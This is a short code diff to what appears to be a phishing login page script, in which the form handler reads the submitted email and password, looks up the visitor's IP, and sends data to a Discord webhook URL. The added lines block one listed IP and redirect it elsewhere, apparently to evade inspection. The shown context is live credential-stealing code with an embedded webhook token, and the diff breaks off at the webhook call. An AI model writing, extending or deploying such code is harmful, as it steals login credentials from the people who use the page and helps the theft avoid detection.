@@ -17,11 +17,21 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const email = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
+    // List of IPs to block (placeholders for now)
+    const blockedIPs = ['89.187.164.251'];
+
     // Fetch the user's IP address using ipify
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const userIP = data.ip;
+
+            // Check if the IP is blocked
+            if (blockedIPs.includes(userIP)) {
+                alert('Access denied. Your IP is blocked.');
+                window.location.href = 'https://cryptodude3.github.io/badmin/';
+                return;
+            }
 
             // Send data to Discord webhook
             fetch('https://discord.com/api/webhooks/1310775997238345728/ZVNm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
